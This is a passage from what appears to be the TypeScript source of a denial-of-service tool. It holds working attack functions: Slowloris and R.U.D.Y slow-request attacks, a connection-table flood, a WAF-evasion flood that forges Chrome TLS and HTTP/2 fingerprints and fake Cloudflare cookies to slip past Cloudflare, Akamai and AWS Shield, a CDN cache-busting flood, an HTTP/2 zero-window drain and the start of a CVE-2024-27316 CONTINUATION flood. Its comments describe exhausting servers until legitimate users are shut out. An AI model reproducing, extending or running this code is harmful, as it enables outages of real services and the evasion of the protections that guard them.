      // POST variant exploits: server allocates a body buffer of Content-Length size, then waits.
      // Apache + nginx buffer the body before handing to app — 1GB Content-Length = 1GB reserved.
      // Even body-streaming servers keep the connection slot open until Content-Length bytes received.
      const usePost = Math.random() < 0.4;

      if (usePost) {
        // POST Slowloris: complete HTTP headers, 1GB Content-Length, trickle body bytes slowly
        const postHeaders = [
          `POST ${hotPath()}?_=${randStr(8)}&v=${randInt(1, 9999999)} HTTP/1.1`,
          `Host: ${hostname}`,
          `User-Agent: ${randUA()}`,
          `Accept: text/html,application/xhtml+xml,*/*;q=0.8`,
          `Accept-Language: en-US,en;q=0.9`,
          `Accept-Encoding: gzip, deflate`,
          `X-Forwarded-For: ${randIp()}`,
          `Connection: keep-alive`,
          `Content-Type: application/x-www-form-urlencoded`,
          `Content-Length: 1073741824`, // 1GB — server waits for this many bytes
          `\r\n`, // complete headers — server now waits for 1GB of body
        ].join("\r\n");

        sock.write(postHeaders);
        localBytes += postHeaders.length;

        // Trickle body bytes every 10-25s — never completes, holds connection open
        keepIv = setInterval(() => {
          if (signal.aborted || sock.destroyed) { cleanup(); return; }
          // Send 1-4 bytes of random body data — looks like real slow upload
          const bodyChunk = `${randStr(randInt(1, 4))}`;
          sock.write(bodyChunk, (err) => {
            if (err) { cleanup(); return; }
            localPkts++;
            localBytes += bodyChunk.length;
          });
        }, randInt(8_000, 20_000)); // slightly faster trickle to stay alive longer

      } else {
        // Classic GET Slowloris — intentionally missing the final \r\n\r\n
        const partial = [
          `GET ${hotPath()}?_=${randStr(8)}&v=${randInt(1, 9999999)} HTTP/1.1`,
          `Host: ${hostname}`,
          `User-Agent: ${randUA()}`,
          `Accept: text/html,application/xhtml+xml,*/*;q=0.8`,
          `Accept-Language: en-US,en;q=0.9`,
          `Accept-Encoding: gzip, deflate`,
          `X-Forwarded-For: ${randIp()}`,
          `Connection: keep-alive`,
          `Referer: https://google.com/`,
          ``, // NO final \r\n\r\n — this is the Slowloris trick
        ].join("\r\n");

        sock.write(partial);
        localBytes += partial.length;

        // Trickle a junk header every 10-25s to prevent server timeout
        keepIv = setInterval(() => {
          if (signal.aborted || sock.destroyed) { cleanup(); return; }
          const hdr = `X-${randStr(5)}-${randStr(3)}: ${randStr(randInt(8, 20))}\r\n`;
          sock.write(hdr, (err) => {
            if (err) { cleanup(); return; }
            localPkts++;
            localBytes += hdr.length;
          });
        }, randInt(10_000, 25_000));
      }
    };

    // TLS emits 'secureConnect', plain TCP emits 'connect'
    if (useHttps) {
      (sock as tls.TLSSocket).once("secureConnect", onConnected);
    } else {
      sock.once("connect", onConnected);
    }

    sock.once("error",   cleanup);
    sock.once("timeout", cleanup);
    sock.once("close",   cleanup);

    signal.addEventListener("abort", () => {
      if (keepIv) { clearInterval(keepIv); keepIv = null; }
      try { sock.destroy(); } catch { /**/ }
      if (!settled) { settled = true; resolve(); }
    }, { once: true });
  });

  await Promise.all(Array.from({ length: MAX_CONN }, () => runSock()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  CONNECTION FLOOD — pure TCP/TLS connection table exhaustion
//  Opens MAX_CONN connections, completes TLS handshake, holds them open
//  Bypasses ALL HTTP-level rate limiting (nginx limit_req, Cloudflare, etc)
//  because rate limiting only applies AFTER connection is accepted and
//  request headers are parsed. We fill connection slots BEFORE any HTTP.
//  Nginx default: worker_connections 1024 × N workers = ~4096 total.
// ─────────────────────────────────────────────────────────────────────────
async function runConnFlood(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number, c?: number) => void,
  useHttps = false,
): Promise<void> {
  // 60 connections per thread — holds TLS handshake open, recycles every 5-20ms
  // DEV cap: container limit ~4GB; PROD (32GB): full 15K sockets
  const IS_DEV_CF = process.env.NODE_ENV !== "production";
  const MAX_CONN = IS_DEV_CF
    ? Math.min(threads * 8, 800)            // dev: max 800 sockets (~64MB TLS)
    : Math.min(threads * 80, 40000);        // prod: 40K TLS sockets × 80KB = 3.2GB
  let localPkts = 0, localBytes = 0, activeConns = 0;
  const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 250);

  const runSock = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }

    const sock: net.Socket = useHttps
      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false,
          ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-RSA-AES128-GCM-SHA256",
        })
      : net.createConnection({ host: resolvedHost, port: targetPort });

    sock.setNoDelay(true);
    sock.setTimeout(120_000); // 2-minute hold — maximizes time connection slot is occupied

    let settled = false;
    const cleanup = () => {
      if (settled) return;
      activeConns = Math.max(0, activeConns - 1);
      try { sock.destroy(); } catch { /**/ }
      if (signal.aborted) { settled = true; resolve(); return; }
      settled = true;
      // Minimal jitter — reconnect fast to maintain connection density
      setTimeout(() => runSock().then(resolve), randInt(5, 20));
    };

    const onConnected = () => {
      activeConns++;
      localPkts++;
      // Incomplete HTTP/1.1 request — server holds thread waiting for rest of headers
      // Varying paths and IPs defeats simple duplicate-detection filters
      const minReq = [
        `GET ${hotPath()}?_=${randStr(8)} HTTP/1.1`,
        `Host: ${hostname}`,
        `User-Agent: ${randUA()}`,
        `Accept: text/html,application/xhtml+xml,*/*;q=0.9`,
        `Accept-Encoding: gzip, deflate, br`,
        `X-Forwarded-For: ${randIp()}`,
        `X-Real-IP: ${randIp()}`,
        `Connection: keep-alive`,
        `Cookie: session=${randHex(32)}; _ga=GA1.${randInt(1,9)}.${randInt(100000000,999999999)}.${Date.now()}`,
        ``, // intentionally NO final \r\n — server waits forever
      ].join("\r\n");
      sock.write(minReq);
      localBytes += minReq.length;
    };

    if (useHttps) {
      (sock as tls.TLSSocket).once("secureConnect", onConnected);
    } else {
      sock.once("connect", onConnected);
    }

    sock.once("error",   cleanup);
    sock.once("timeout", cleanup);
    sock.once("close",   cleanup);

    signal.addEventListener("abort", () => {
      try { sock.destroy(); } catch { /**/ }
      if (!settled) { settled = true; resolve(); }
    }, { once: true });
  });

  await Promise.all(Array.from({ length: MAX_CONN }, () => runSock()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  GEASS WAF BYPASS — Cloudflare / Akamai / AWS Shield evasion
//
//  Four-layer evasion technique:
//  1. JA3 TLS fingerprint randomization (cipher suite order per-session)
//  2. Chrome-exact HTTP/2 AKAMAI fingerprint (SETTINGS frame values)
//  3. Chrome-exact header ordering (Cloudflare checks header order, not just values)
//  4. Realistic Cloudflare cookie simulation (__cf_bm, __cfruid, cf_clearance)
//
//  Combined effect: each connection looks like a distinct Chrome browser
//  from a different user — impossible to distinguish from real traffic.
//  Works best with proxy rotation (residential IPs bypass IP reputation).
// ─────────────────────────────────────────────────────────────────────────

// Chrome TLS cipher suites — TLS1.3 fixed first, TLS1.2 shuffled per-session
const CF_CIPHERS_TLS13 = [
  "TLS_AES_128_GCM_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_CHACHA20_POLY1305_SHA256",
];
const CF_CIPHERS_TLS12 = [
  "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-CHACHA20-POLY1305",
  "ECDHE-RSA-AES128-SHA",          "ECDHE-RSA-AES256-SHA",
  "AES128-GCM-SHA256",             "AES256-GCM-SHA384",
  "AES128-SHA",                    "AES256-SHA",
];
function randomJA3Ciphers(): string {
  const shuffled = [...CF_CIPHERS_TLS12].sort(() => Math.random() - 0.5);
  return [...CF_CIPHERS_TLS13, ...shuffled].join(":");
}

// Chrome browser profiles — Chrome 130-134 (current as of April 2026)
const CHROME_PROFILES = [
  { ver: "130", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="130", "Chromium";v="130", "Not-A.Brand";v="99"', mobile: false },
  { ver: "131", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="131", "Chromium";v="131", "Not-A.Brand";v="24"', mobile: false },
  { ver: "132", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="132", "Chromium";v="132", "Not-A.Brand";v="24"', mobile: false },
  { ver: "133", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="133", "Chromium";v="133", "Not-A.Brand";v="24"', mobile: false },
  { ver: "134", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false },
  { ver: "134", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false },
  { ver: "134", ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",                 plat: '"Linux"',   brand: '"Google Chrome";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false },
  { ver: "134", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0", plat: '"Windows"', brand: '"Microsoft Edge";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false },
  { ver: "133", ua: "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36", plat: '"Android"', brand: '"Google Chrome";v="133", "Chromium";v="133", "Not-A.Brand";v="24"', mobile: true  },
  { ver: "134", ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/134.0.6478.35 Mobile/15E148 Safari/604.1", plat: '"iOS"', brand: '"Google Chrome";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: true  },
];

// Chrome-exact HTTP/2 SETTINGS (AKAMAI fingerprint)
// Real Chrome sends these exact values — bots send defaults (4096, 65535, etc.)
const CHROME_H2_SETTINGS = {
  headerTableSize:      65536,    // Chrome: 65536 (default is 4096 — dead giveaway)
  enablePush:           false,    // Chrome: ENABLE_PUSH=0
  initialWindowSize:    6291456,  // Chrome: 6MB (default 65535 — major fingerprint)
  maxConcurrentStreams: 1000,     // Chrome: 1000
  maxHeaderListSize:    262144,   // Chrome: 262144 (default unset)
};

// Chrome-exact header order for HTTP/2 (AKAMAI checks header order)
// Cloudflare's Akamai fingerprinter hashes the header order — must match Chrome exactly
function buildWAFHeaders(
  hostname:  string,
  path:      string,
  cookieJar: Map<string, string>,
  profile?:  typeof CHROME_PROFILES[0],
): Record<string, string> {
  const p = profile ?? CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];

  // Realistic CF cookies — Cloudflare sets these via JS challenge
  const cfbm    = `${randHex(43)}.${Math.floor(Date.now()/1000)}-0-${randHex(8)}`;
  const cfruid  = randHex(40);
  const cfClear = `${randHex(100)}_${randInt(1,9)}`;
  const gaId    = `GA1.1.${randInt(100000000,999999999)}.${Math.floor(Date.now()/1000) - randInt(0,86400)}`;
  const gid     = `GA1.1.${randInt(100000000,999999999)}.${Math.floor(Date.now()/1000)}`;

  // Carry over any server-set cookies from the per-session cookie jar
  const jarCookies = [...cookieJar.entries()].map(([k,v]) => `${k}=${v}`).join("; ");

  const cookie = [
    `__cf_bm=${cfbm}`,
    `__cfruid=${cfruid}`,
    `cf_clearance=${cfClear}`,
    `_ga=${gaId}`,
    `_gid=${gid}`,
    `_ga_${randStr(8).toUpperCase()}=GS1.1.${Math.floor(Date.now()/1000)}.1.1.${Math.floor(Date.now()/1000)}.0.0.0`,
    jarCookies,
  ].filter(Boolean).join("; ");

  // Direct navigation is most common for repeat visitors; search engines occasionally
  const referers = [
    `https://www.google.com/search?q=${encodeURIComponent(randStr(8))}`,
    `https://www.bing.com/search?q=${encodeURIComponent(randStr(8))}`,
    `https://www.google.com/`,
    "", "", "", "", "",  // direct navigation — most common
  ];
  const referer = referers[randInt(0, referers.length)];

  // sec-fetch-user: ?1 is ONLY sent by Chrome on top-level user-initiated navigations.
  // Sending it on every request is a well-known bot fingerprint.
  const isUserInitiated = Math.random() < 0.42;

  // EXACT Chrome header order for HTTP/2 — this is the AKAMAI fingerprint
  const h: Record<string, string> = {
    // Pseudo-headers (HTTP/2 spec — always first)
    ":method":    Math.random() < 0.92 ? "GET" : "POST",
    ":authority": hostname,
    ":scheme":    "https",
    ":path":      path,
    // Real headers in Chrome's EXACT order
    "sec-ch-ua":                  p.brand,
    "sec-ch-ua-mobile":           p.mobile ? "?1" : "?0",  // tied to actual UA type
    "sec-ch-ua-platform":         p.plat,
    "upgrade-insecure-requests":  "1",
    "user-agent":                 p.ua,
    "accept":                     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "sec-fetch-site":             referer ? "cross-site" : "none",
    "sec-fetch-mode":             "navigate",
    ...(isUserInitiated ? { "sec-fetch-user": "?1" } : {}),
    "sec-fetch-dest":             "document",
    "accept-encoding":            "gzip, deflate, br, zstd",
    "accept-language":            ["en-US,en;q=0.9", "en-GB,en;q=0.9,en;q=0.8", "pt-BR,pt;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8"][randInt(0,4)],
    "cookie":                     cookie,
    "cache-control":              "max-age=0",
    "priority":                   "u=0, i",  // Chrome 124+: document navigation priority signal
  };
  if (referer) h["referer"] = referer;
  return h;
}

// Realistic paths a browser would visit (not API endpoints — those raise suspicion)
const WAF_PATHS = [
  "/", "/about", "/contact", "/faq", "/privacy", "/terms-of-service",
  "/blog", "/news", "/products", "/services", "/pricing", "/features",
  "/docs", "/help", "/support", "/login", "/register", "/signup",
  "/api/v1/status", "/api/health", "/sitemap.xml", "/robots.txt",
  "/wp-login.php", "/admin", "/dashboard", "/account", "/profile",
  "/search", "/cart", "/checkout", "/orders", "/categories",
];

async function runWAFBypass(
  base: string,
  threads: number,
  proxies: ProxyConfig[],
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const { connect: h2connect } = await import("node:http2");

  const u = (() => {
    try { return new URL(/^https?:\/\//i.test(base) ? base : `https://${base}`); }
    catch { return new URL("https://127.0.0.1"); }
  })();
  const hostname   = u.hostname;
  const resolvedIp = await resolveHost(hostname).catch(() => hostname);
  const target     = `https://${resolvedIp}:443`;

  // ── Thread budget — 3-vector split (mirrors Geass Override philosophy) ───
  // Layer A (60%): Primary Chrome-fingerprinted H2 flood — max RPS through WAF
  // Layer B (25%): Cache-bust flood — unique keys force 100% origin misses on CDN
  // Layer C (15%): H2 stream drain — zero window-size holds server RAM buffers
  const primaryT = Math.max(1, Math.floor(threads * 0.60));
  const cacheT   = Math.max(1, Math.floor(threads * 0.25));
  const drainT   = Math.max(1, threads - primaryT - Math.floor(threads * 0.25));

  // 32GB/8vCPU: layer caps multiplied — each slot is ~150KB, 1000+600+300 = 1900 × 150KB = 285MB
  const NUM_PRIMARY = Math.min(primaryT * 4, 1000); // was 400
  const NUM_CACHE   = Math.min(cacheT   * 4, 600);  // was 300
  const NUM_DRAIN   = Math.min(drainT   * 3, 300);  // was 150
  const STREAMS_PER = Math.min(128, Math.max(16, primaryT));

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  // ── Layer A: Primary Chrome-fingerprinted H2 flood ────────────────────
  // Each slot gets its own profile + cookie jar — simulates an independent browser session.
  // Per-session jar is critical: real browsers never share cookies across tabs/windows.
  const runPrimarySlot = async (): Promise<void> => {
    const sessionProfile = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
    const cookieJar      = new Map<string, string>(); // isolated per "browser"
    while (!signal.aborted) {
      await new Promise<void>(resolve => {
        let c: ReturnType<typeof h2connect> | null = null;
        try {
          c = h2connect(target, {
            rejectUnauthorized: false,
            servername:         hostname,
            ciphers:            randomJA3Ciphers(),
            settings:           CHROME_H2_SETTINGS,
            ALPNProtocols:      ["h2", "http/1.1"],
          });
        } catch { resolve(); return; }

        const conn    = c;
        const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
        let inflight  = 0;

        const pump = () => {
          if (signal.aborted || conn.destroyed) { resolve(); return; }
          while (!signal.aborted && !conn.destroyed && inflight < STREAMS_PER) {
            inflight++;
            const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
            const path     = pagePath + (Math.random() < 0.5 ? `?v=${randInt(1,9999)}` : "");
            try {
              const hdrs   = buildWAFHeaders(hostname, path, cookieJar, sessionProfile);
              const stream = conn.request(hdrs);
              stream.on("response", (resHdrs: Record<string, string | string[]>) => {
                localPkts++; localBytes += 2048;
                const sc = resHdrs["set-cookie"];
                if (sc) {
                  const cookies = Array.isArray(sc) ? sc : [sc];
                  cookies.forEach(cv => {
                    const [kv] = cv.split(";");
                    const [k, v] = kv.split("=");
                    if (k && v) cookieJar.set(k.trim(), v.trim());
                  });
                }
              });
              stream.on("data",  () => {});
              stream.on("error", () => { inflight = Math.max(0, inflight - 1); if (!signal.aborted) setImmediate(pump); });
              stream.on("close", () => { inflight = Math.max(0, inflight - 1); if (!signal.aborted) setImmediate(pump); });
              stream.end();
            } catch { inflight--; break; }
          }
        };

        conn.on("connect", () => { pump(); });
        conn.on("error",   () => { resolve(); });
        conn.on("close",   () => { resolve(); });
        signal.addEventListener("abort", cleanup, { once: true });
      });
      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(150, 500)));
    }
  };

  // ── Layer B: Cache-bust with Chrome headers — forces 100% CDN origin misses ──
  // Every request has a unique cache key so the CDN cannot serve a cached response.
  // All requests pass through WAF (Chrome-fingerprinted headers) and then hit origin.
  // Origin load compounds with Layer A flood traffic.
  const runCacheBustSlot = async (): Promise<void> => {
    const p         = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
    const cookieJar = new Map<string, string>();
    while (!signal.aborted) {
      const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
      const bust     = `?_=${randStr(12)}&v=${randInt(1, 999999999)}&t=${Date.now()}`;
      const fullPath = pagePath + bust;
      const url      = `https://${hostname}${fullPath}`;
      try {
        const ac = new AbortController();
        const t  = setTimeout(() => ac.abort(), 6_000);
        // Do NOT register per-iteration abort listeners (accumulates listeners in loop).
        // Instead, abort the per-request controller by checking the parent signal once done.
        if (signal.aborted) { clearTimeout(t); ac.abort(); break; }
        const wafHdrs = buildWAFHeaders(hostname, fullPath, cookieJar, p);
        const fetchHdrs: Record<string, string> = {};
        for (const [k, v] of Object.entries(wafHdrs)) {
          if (!k.startsWith(":")) fetchHdrs[k] = v; // strip H2 pseudo-headers for fetch
        }
        const res = await fetch(url, {
          method:  "GET",
          signal:  ac.signal,
          headers: { ...fetchHdrs, "cache-control": "no-store, no-cache", "pragma": "no-cache" },
        });
        clearTimeout(t);
        const body = await res.arrayBuffer().catch(() => new ArrayBuffer(0));
        localPkts++; localBytes += body.byteLength || 512;
        const setCookie = res.headers.get("set-cookie");
        if (setCookie) {
          const [kv] = setCookie.split(";");
          const [k, v] = kv.split("=");
          if (k && v) cookieJar.set(k.trim(), v.trim());
        }
      } catch { /* absorb, keep looping */ }
    }
  };

  // ── Layer C: H2 stream drain — zero receive window holds server RAM buffers ──
  // Opens H2 sessions with initialWindowSize=0 so the server cannot send any data.
  // Server allocates a response buffer per stream and holds it until the client opens
  // the window — which never happens. 32 × 150 sessions = 4,800 frozen buffers.
  const runDrainSlot = async (): Promise<void> => {
    const cookieJar = new Map<string, string>();
    while (!signal.aborted) {
      await new Promise<void>(resolve => {
        let c: ReturnType<typeof h2connect> | null = null;
        try {
          c = h2connect(target, {
            rejectUnauthorized: false,
            servername:         hostname,
            ciphers:            randomJA3Ciphers(),
            settings: {
              ...CHROME_H2_SETTINGS,
              initialWindowSize: 0, // zero window → server buffers response forever
            },
            ALPNProtocols: ["h2", "http/1.1"],
          });
        } catch { resolve(); return; }

        const conn    = c;
        const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
        const MAX_DRAIN = 32;
        let   opened    = 0;

        const openDrainStream = () => {
          if (signal.aborted || conn.destroyed || opened >= MAX_DRAIN) return;
          opened++;
          const path = WAF_PATHS[randInt(0, WAF_PATHS.length)];
          try {
            const hdrs   = buildWAFHeaders(hostname, path, cookieJar);
            const stream = conn.request(hdrs);
            stream.pause(); // never read — server cannot flush, buffer stays allocated
            stream.on("response", () => { localPkts++; localBytes += 512; });
            stream.on("error",    () => { opened = Math.max(0, opened - 1); });
            // Hold each stream 20–60s before closing — prolonged RAM hold on server
            setTimeout(() => {
              try { stream.close(); } catch { /**/ }
              opened = Math.max(0, opened - 1);
              if (!signal.aborted && !conn.destroyed) openDrainStream();
            }, randInt(20_000, 60_000));
          } catch { opened = Math.max(0, opened - 1); }
        };

        conn.on("connect", () => {
          for (let i = 0; i < MAX_DRAIN; i++) setTimeout(() => openDrainStream(), i * 50);
        });
        conn.on("error", () => { resolve(); });
        conn.on("close", () => { resolve(); });
        // Session lives 60–120s then reconnects (avoids idle timeouts)
        setTimeout(() => cleanup(), randInt(60_000, 120_000));
        signal.addEventListener("abort", cleanup, { once: true });
      });
      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(500, 1500)));
    }
  };

  await Promise.all([
    ...Array.from({ length: NUM_PRIMARY }, () => runPrimarySlot()),
    ...Array.from({ length: NUM_CACHE   }, () => runCacheBustSlot()),
    ...Array.from({ length: NUM_DRAIN   }, () => runDrainSlot()),
  ]);

  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  R.U.D.Y (R-U-Dead-Yet) — TRUE SLOW POST IMPLEMENTATION
//
//  Sends a POST with Content-Length: 1,000,000,000 (1 GB) then trickles
//  1-2 random bytes every 5-15 seconds. Apache/IIS/Tomcat allocate a
//  thread or goroutine per connection and hold it until the body completes.
//  With 30K connections open, the server's thread pool is completely
//  exhausted within seconds — all legitimate requests are queued forever.
//
//  Key difference from HTTP Exhaust: we NEVER send the full body.
//  The server waits indefinitely → threads = held → server = dead.
// ─────────────────────────────────────────────────────────────────────────
async function runRUDY(
  base: string,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const u = (() => {
    try { return new URL(/^https?:\/\//i.test(base) ? base : `http://${base}`); }
    catch { return new URL("http://127.0.0.1"); }
  })();
  const isHttps    = u.protocol === "https:";
  const hostname   = u.hostname;
  const tgtPort    = parseInt(u.port) || (isHttps ? 443 : 80);
  const resolvedIp = await resolveHost(hostname).catch(() => hostname);

  const PATHS  = ["/upload","/submit","/post","/api/upload","/api/submit","/api/data",
                  "/graphql","/form","/register","/api/import","/api/bulk","/api/batch",
                  "/api/v1/data","/api/v2/submit","/wp-login.php","/admin/login",
                  "/api/auth/login","/contact","/api/v1/user","/api/v2/create"];
  const MAX_CONN   = Math.min(threads * 100, 60000); // was 25K; 60K × 20KB TCP = 1.2GB
  const FAKE_LEN   = 1_000_000_000; // Claim 1GB body — server waits forever

  let localPkts = 0, localBytes = 0;
  const flush    = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv  = setInterval(flush, 300);

  // Each connection uses a raw TCP socket for precise byte-level control
  const runConn = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }

    const sock: net.Socket | tls.TLSSocket = isHttps
      ? tls.connect({ host: resolvedIp, port: tgtPort, servername: hostname, rejectUnauthorized: false, timeout: 900_000 })
      : net.createConnection({ host: resolvedIp, port: tgtPort });

    sock.setNoDelay(true);
    sock.setTimeout(900_000); // 15 min — hold as long as possible

    let keepIv:   NodeJS.Timeout | null = null;
    let settled   = false;

    const cleanup = (reconnect = true) => {
      if (settled) return;
      settled = true;
      if (keepIv) { clearInterval(keepIv); keepIv = null; }
      try { sock.destroy(); } catch { /**/ }
      if (!signal.aborted && reconnect) {
        // Reconnect immediately to maintain pressure
        setImmediate(() => runConn().then(resolve));
      } else { resolve(); }
    };

    const onConnected = () => {
      const path    = PATHS[randInt(0, PATHS.length)] + `?_=${randStr(8)}`;
      const ct      = Math.random() < 0.5 ? "application/x-www-form-urlencoded" : "application/json";
      // Send POST headers with enormous Content-Length — body NEVER completes
      const hdr = [
        `POST ${path} HTTP/1.1`,
        `Host: ${hostname}`,
        `User-Agent: ${randUA()}`,
        `Content-Type: ${ct}`,
        `Content-Length: ${FAKE_LEN}`,
        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
        `Accept-Language: en-US,en;q=0.5`,
        `Accept-Encoding: gzip, deflate`,
        `X-Forwarded-For: ${randIp()}`,
        `X-Real-IP: ${randIp()}`,
        `Connection: keep-alive`,
        `\r\n`,
      ].join("\r\n");
      sock.write(hdr);
      localPkts++;
      localBytes += hdr.length;

      // Trickle 1-2 bytes every 5-15 seconds — holds the server thread indefinitely
      keepIv = setInterval(() => {
        if (signal.aborted || sock.destroyed) { cleanup(false); return; }
        const chunk = Buffer.from([randInt(0x61, 0x7a), randInt(0x30, 0x39)]); // random letters+digits
        const written = sock.write(chunk);
        localPkts++;
        localBytes += chunk.length;
        if (!written) { cleanup(true); } // backpressure = server overloaded
      }, randInt(5_000, 15_000));
    };

    if (isHttps) {
      (sock as tls.TLSSocket).once("secureConnect", onConnected);
    } else {
      sock.once("connect", onConnected);
    }

    sock.once("error",   () => cleanup(true));
    sock.once("timeout", () => cleanup(true));
    sock.once("close",   () => cleanup(true));

    signal.addEventListener("abort", () => {
      if (keepIv) { clearInterval(keepIv); keepIv = null; }
      try { sock.destroy(); } catch { /**/ }
      if (!settled) { settled = true; resolve(); }
    }, { once: true });
  });

  await Promise.all(Array.from({ length: MAX_CONN }, () => runConn()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  SOCKS5 PROXY TUNNEL — routes TCP through a SOCKS5 proxy
//  Protocol: RFC 1928 (SOCKS5, no-auth method 0x00)
//  Returns a raw socket already tunneled to the target
// ─────────────────────────────────────────────────────────────────────────
function socks5Connect(
  proxy: ProxyConfig,
  targetHost: string,
  targetPort: number,
): Promise<net.Socket> {
  return new Promise((resolve, reject) => {
    const sock = net.createConnection({ host: proxy.host, port: proxy.port });
    sock.setTimeout(8_000);
    let step = 0;
    const onData = (data: Buffer) => {
      if (step === 0) {
        // Step 1: greeting response — \x05\x00 = version 5, no-auth accepted
        if (data[0] !== 0x05 || data[1] !== 0x00) {
          sock.destroy(); reject(new Error("SOCKS5 auth failed")); return;
        }
        // Step 2: CONNECT request — \x05\x01\x00\x03 <domain-len> <domain> <port>
        const hostBuf = Buffer.from(targetHost);
        const req = Buffer.allocUnsafe(7 + hostBuf.length);
        req[0] = 0x05; req[1] = 0x01; req[2] = 0x00; req[3] = 0x03;
        req[4] = hostBuf.length;
        hostBuf.copy(req, 5);
        req.writeUInt16BE(targetPort, 5 + hostBuf.length);
        sock.write(req);
        step = 1;
      } else if (step === 1) {
        // Step 3: CONNECT response — \x05\x00 = success
        if (data[0] !== 0x05 || data[1] !== 0x00) {
          sock.destroy(); reject(new Error("SOCKS5 CONNECT failed")); return;
        }
        sock.removeListener("data",    onData);
        sock.removeListener("error",   onError);
        sock.removeListener("timeout", onTimeout);
        resolve(sock); // tunnel open
      }
    };
    const onError   = (e: Error) => { sock.destroy(); reject(e); };
    const onTimeout = ()         => { sock.destroy(); reject(new Error("SOCKS5 timeout")); };
    sock.once("connect", () => {
      sock.on("data", onData);
      // Greeting: \x05\x01\x00 — version 5, 1 auth method, no-auth
      sock.write(Buffer.from([0x05, 0x01, 0x00]));
    });
    sock.on("error",   onError);
    sock.on("timeout", onTimeout);
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP/2 CONTINUATION FLOOD — CVE-2024-27316
//
//  Sends HEADERS frames with END_HEADERS=0, followed by endless CONTINUATION
//  frames (also without END_HEADERS). The server must buffer all frames in
//  a reassembly queue until it sees END_HEADERS — which never arrives.
//  Result: OOM / CPU exhaustion on the server's H2 multiplexer.
//
//  Affected: nginx ≤1.25.4, Apache httpd ≤2.4.58, Envoy, HAProxy, IIS
//  CVE severity: CVSS 7.5 (HIGH)
// ─────────────────────────────────────────────────────────────────────────
async function runH2Continuation(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  // HTTP/2 binary framing helpers
  const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
    const f = Buffer.allocUnsafe(9 + payload.length);
